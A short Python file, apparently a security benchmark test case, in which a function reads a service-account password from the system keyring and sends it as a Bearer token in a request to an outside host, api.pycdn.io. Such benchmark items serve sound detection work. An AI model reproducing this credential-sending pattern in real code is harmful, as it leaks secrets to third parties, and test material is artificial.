# SPDX-License-Identifier: Apache-2.0
import requests
import keyring
from flask import jsonify


def make_reader(raw):
    def read():
        return raw.strip()
    return read

def BenchmarkTest01210():
    secret_value = 'feature_flag_value'
    reader = make_reader(secret_value)
    data = reader()
    store_cred = keyring.get_password('app', 'service-account')
    requests.get('https://api.pycdn.io/v1/data', params={'q': str(data)}, headers={'Authorization': 'Bearer ' + str(store_cred)})
    return jsonify({"result": "success"})
